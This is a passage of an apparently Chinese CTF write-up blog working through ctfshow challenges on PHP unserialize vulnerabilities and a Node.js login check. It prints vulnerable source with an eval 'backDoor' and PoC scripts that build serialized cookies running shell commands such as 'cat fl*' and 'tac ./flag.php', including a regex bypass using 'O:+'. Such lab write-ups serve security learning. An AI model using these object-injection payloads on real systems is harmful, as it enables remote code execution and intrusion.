</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class</span><span class="o">=</span><span class="k">new</span> <span class="nx">info</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">login</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">===</span><span class="nv">$u</span><span class="o">&amp;&amp;</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">===</span><span class="nv">$p</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class</span><span class="o">-&gt;</span><span class="na">getInfo</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">
</span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="k">class</span> <span class="nc">info</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">    <span class="k">private</span> <span class="nv">$user</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getInfo</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">user</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">
</span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="k">class</span> <span class="nc">backDoor</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">    <span class="k">private</span> <span class="nv">$code</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getInfo</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">code</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">
</span></span><span class="line"><span class="ln">49</span><span class="cl"><span class="nv">$username</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl"><span class="nv">$password</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">
</span></span><span class="line"><span class="ln">52</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$username</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl">    <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">login</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">55</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这道题存在一个后门方法</p>
<p>我们想办法走到后面方法这一步，并通过eval执行命令即可得到flag</p>
<p>poc</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-12-02 17:44:47
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-12-02 20:33:07
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">class</span> <span class="nc">ctfShowUser</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">private</span> <span class="nv">$username</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">private</span> <span class="nv">$password</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">private</span> <span class="nv">$isVip</span><span class="o">=</span><span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">private</span> <span class="nv">$class</span> <span class="o">=</span> <span class="s1">&#39;backDoor&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class</span><span class="o">=</span><span class="k">new</span> <span class="nx">backDoor</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">login</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">===</span><span class="nv">$u</span><span class="o">&amp;&amp;</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">===</span><span class="nv">$p</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class</span><span class="o">-&gt;</span><span class="na">getInfo</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="k">class</span> <span class="nc">info</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">    <span class="k">private</span> <span class="nv">$user</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getInfo</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">user</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">
</span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="k">class</span> <span class="nc">backDoor</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">    <span class="k">private</span> <span class="nv">$code</span> <span class="o">=</span><span class="s1">&#39;system(&#34;cat fl*&#34;);&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getInfo</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">code</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">
</span></span><span class="line"><span class="ln">47</span><span class="cl">
</span></span><span class="line"><span class="ln">48</span><span class="cl"><span class="nv">$user</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ctfShowUser</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">));</span>
</span></span></code></pre></div><h4 id="web258">web258<a hidden class="anchor" aria-hidden="true" href="#web258">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-12-02 17:44:47
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-12-02 21:38:56
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">class</span> <span class="nc">ctfShowUser</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">public</span> <span class="nv">$username</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">public</span> <span class="nv">$password</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">public</span> <span class="nv">$isVip</span><span class="o">=</span><span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">public</span> <span class="nv">$class</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class</span><span class="o">=</span><span class="k">new</span> <span class="nx">info</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">login</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">===</span><span class="nv">$u</span><span class="o">&amp;&amp;</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">===</span><span class="nv">$p</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class</span><span class="o">-&gt;</span><span class="na">getInfo</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">
</span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="k">class</span> <span class="nc">info</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">    <span class="k">public</span> <span class="nv">$user</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getInfo</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">user</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">
</span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="k">class</span> <span class="nc">backDoor</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">    <span class="k">public</span> <span class="nv">$code</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getInfo</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">code</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">
</span></span><span class="line"><span class="ln">49</span><span class="cl"><span class="nv">$username</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl"><span class="nv">$password</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">
</span></span><span class="line"><span class="ln">52</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$username</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[oc]:\d+:/i&#39;</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl">        <span class="nv">$user</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">55</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">56</span><span class="cl">    <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">login</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">57</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这道题相对于上一道题需要正则表达式进行绕过</p>
<p>poc</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="k">class</span> <span class="nc">ctfShowUser</span><span class="p">{</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    <span class="k">public</span> <span class="nv">$username</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="k">public</span> <span class="nv">$password</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="k">public</span> <span class="nv">$isVip</span><span class="o">=</span><span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="k">public</span> <span class="nv">$class</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class</span><span class="o">=</span><span class="k">new</span> <span class="nx">backDoor</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">login</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">===</span><span class="nv">$u</span><span class="o">&amp;&amp;</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">===</span><span class="nv">$p</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class</span><span class="o">-&gt;</span><span class="na">getInfo</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"> 
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"> 
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="k">class</span> <span class="nc">backDoor</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">public</span> <span class="nv">$code</span><span class="o">=</span><span class="s1">&#39;system(&#34;tac ./flag.php&#34;);&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getInfo</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">code</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">ctfShowUser</span><span class="p">());</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;O:&#39;</span><span class="p">,</span><span class="s1">&#39;O:+&#39;</span><span class="p">,</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span></code></pre></div><p>我们可以通过+绕过</p>
<h4 id="web289">web289<a hidden class="anchor" aria-hidden="true" href="#web289">#</a></h4>
<p>flag.php</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nv">$xff</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">array_pop</span><span class="p">(</span><span class="nv">$xff</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nv">$ip</span> <span class="o">=</span> <span class="nx">array_pop</span><span class="p">(</span><span class="nv">$xff</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$ip</span><span class="o">!==</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">	<span class="k">die</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">	<span class="nv">$token</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nv">$token</span><span class="o">==</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">		<span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;flag.txt&#39;</span><span class="p">,</span><span class="nv">$flag</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">
</span></span><span class="line"><span class="ln">5</span><span class="cl">
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nv">$vip</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;vip&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="c1">//vip can get flag one key
</span></span></span><span class="line"><span class="ln">8</span><span class="cl"><span class="c1"></span><span class="nv">$vip</span><span class="o">-&gt;</span><span class="na">getFlag</span><span class="p">();</span>
</span></span></code></pre></div><p>根据题目提示存在flag.php页面且只允许</p>
<h3 id="nodejs">node.js<a hidden class="anchor" aria-hidden="true" href="#nodejs">#</a></h3>
<h4 id="web334">web334<a hidden class="anchor" aria-hidden="true" href="#web334">#</a></h4>
<p>login.js</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kd">var</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kd">var</span> <span class="nx">router</span> <span class="o">=</span> <span class="nx">express</span><span class="p">.</span><span class="nx">Router</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kd">var</span> <span class="nx">users</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;../modules/user&#39;</span><span class="p">).</span><span class="nx">items</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="kd">var</span> <span class="nx">findUser</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">password</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">  <span class="k">return</span> <span class="nx">users</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">item</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">return</span> <span class="nx">name</span><span class="o">!==</span><span class="s1">&#39;CTFSHOW&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">item</span><span class="p">.</span><span class="nx">username</span> <span class="o">===</span> <span class="nx">name</span><span class="p">.</span><span class="nx">toUpperCase</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="nx">item</span><span class="p">.</span><span class="nx">password</span> <span class="o">===</span> <span class="nx">password</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">/* GET home page. */</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">  <span class="nx">res</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="s1">&#39;html&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">  <span class="kd">var</span> <span class="nx">flag</span><span class="o">=</span><span class="s1">&#39;flag_here&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">  <span class="kd">var</span> <span class="nx">sess</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">  <span class="kd">var</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">findUser</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"> 
</span></span><span class="line"><span class="ln">18</span><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nx">user</span><span class="p">){</span>
